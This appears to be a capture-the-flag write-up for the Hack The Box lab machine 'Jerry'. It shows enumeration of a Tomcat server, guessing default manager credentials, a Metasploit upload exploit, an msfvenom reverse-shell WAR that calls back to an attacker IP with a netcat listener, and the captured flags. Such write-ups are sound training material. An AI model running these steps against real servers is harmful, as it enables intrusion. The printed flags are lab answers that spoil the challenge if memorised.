# Jerry

## Information Gathering
10.10.10.95<br>
Apache Tomcat/7.0.88

## Enumeration
Scanning with nmap
> nmap -sC -sV -oN nmap/jerry.nmap -Pn 10.10.10.95
```bash
# Nmap 7.92 scan initiated Wed Dec 29 16:09:44 2021 as: nmap -sC -sV -oN nmap/jerry.nmap -Pn 10.10.10.95
Nmap scan report for 10.10.10.95
Host is up (0.029s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 29 16:09:58 2021 -- 1 IP address (1 host up) scanned in 14.74 seconds
```
I also began directory busting the web application while I look for attack vectors with Apache Tomcat/Coyote webserver
> gobuster dir -u http://10.10.10.95 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x html,php,txt -o gob/jerry.gob
```bash
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/manager              (Status: 302) [Size: 0] [--> /manager/]
/http%3A%2F%2Fwww     (Status: 400) [Size: 0]
/http%3A%2F%2Fwww.html (Status: 400) [Size: 0]
/http%3A%2F%2Fwww.php (Status: 400) [Size: 0]
/http%3A%2F%2Fwww.txt (Status: 400) [Size: 0]
/http%3A%2F%2Fyoutube (Status: 400) [Size: 0]
/http%3A%2F%2Fyoutube.php (Status: 400) [Size: 0]
/http%3A%2F%2Fyoutube.txt (Status: 400) [Size: 0]
/http%3A%2F%2Fyoutube.html (Status: 400) [Size: 0]
/http%3A%2F%2Fblogs   (Status: 400) [Size: 0]
/http%3A%2F%2Fblogs.html (Status: 400) [Size: 0]
/http%3A%2F%2Fblogs.php (Status: 400) [Size: 0]
/http%3A%2F%2Fblogs.txt (Status: 400) [Size: 0]
/http%3A%2F%2Fblog.txt (Status: 400) [Size: 0]
/http%3A%2F%2Fblog    (Status: 400) [Size: 0]
/http%3A%2F%2Fblog.html (Status: 400) [Size: 0]
/http%3A%2F%2Fblog.php (Status: 400) [Size: 0]
/**http%3A%2F%2Fwww   (Status: 400) [Size: 0]
/**http%3A%2F%2Fwww.php (Status: 400) [Size: 0]
/**http%3A%2F%2Fwww.txt (Status: 400) [Size: 0]
/**http%3A%2F%2Fwww.html (Status: 400) [Size: 0]
/RELEASE-NOTES.txt    (Status: 200) [Size: 9600]
/External%5CX-News.php (Status: 400) [Size: 0]
/External%5CX-News.txt (Status: 400) [Size: 0]
/External%5CX-News    (Status: 400) [Size: 0]
/External%5CX-News.html (Status: 400) [Size: 0]
/http%3A%2F%2Fcommunity (Status: 400) [Size: 0]
/http%3A%2F%2Fcommunity.html (Status: 400) [Size: 0]
/http%3A%2F%2Fcommunity.php (Status: 400) [Size: 0]
/http%3A%2F%2Fcommunity.txt (Status: 400) [Size: 0]
/http%3A%2F%2Fradar   (Status: 400) [Size: 0]
/http%3A%2F%2Fradar.html (Status: 400) [Size: 0]
/http%3A%2F%2Fradar.php (Status: 400) [Size: 0]
/http%3A%2F%2Fradar.txt (Status: 400) [Size: 0]
/http%3A%2F%2Fjeremiahgrossman (Status: 400) [Size: 0]
/http%3A%2F%2Fjeremiahgrossman.html (Status: 400) [Size: 0]
/http%3A%2F%2Fjeremiahgrossman.php (Status: 400) [Size: 0]
/http%3A%2F%2Fjeremiahgrossman.txt (Status: 400) [Size: 0]
/http%3A%2F%2Fweblog.txt (Status: 400) [Size: 0]
/http%3A%2F%2Fweblog  (Status: 400) [Size: 0]
/http%3A%2F%2Fweblog.html (Status: 400) [Size: 0]
/http%3A%2F%2Fweblog.php (Status: 400) [Size: 0]
/http%3A%2F%2Fswik    (Status: 400) [Size: 0]
/http%3A%2F%2Fswik.html (Status: 400) [Size: 0]
/http%3A%2F%2Fswik.php (Status: 400) [Size: 0]
/http%3A%2F%2Fswik.txt (Status: 400) [Size: 0]
```
## Exploitation

Doing some research for a Tomcat CVE I stumbled upon an arbitrary upload. But first I needed to determine the credentials for the /manager/ directory. I found a default credentials list <a href="https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown">here</a>. After guessing a bunch the credentials were <b>tomcat:s3cret</b>. I want to do this exploit in two ways: Automatically using <a href="https://www.metasploit.com/">Metasploit</a> and manually. Below is the automatic steps:
```bash
msfconsole
msf6 > search tomcat_mgr_upload
msf6 > set httppassword s3cret
msf6 > set httpusername tomcat
msf6 > set rhosts 10.10.10.95
msf6 > set rport 8080
msf6 > exploit
```
Which gives a Meterpreter shell.<br>

Doing the manual way suprisingly doesn't require much more intuition. Using <a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/">msfvenom</a> we can generate a payload to upload to /manager/html. Once the payload is generated, navigating to /shell/ while having a netcat listener gives a shell.
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.122 LPORT=1337 -f war > shell.war
nc -lnvp 1337
```

## Privilege Escalation

I can navigate directly to C:\Users\Administrator\Desktop\flags and cat "2 for the price of one.txt" which gives both user and root flag. I need to do more studying on Windows privilege escalation anyways...

user.txt : 7004dbcef0f854e0fb401875f26ebd00<br>
root.txt : 04a8b36e1545a455393d067e772fe90e
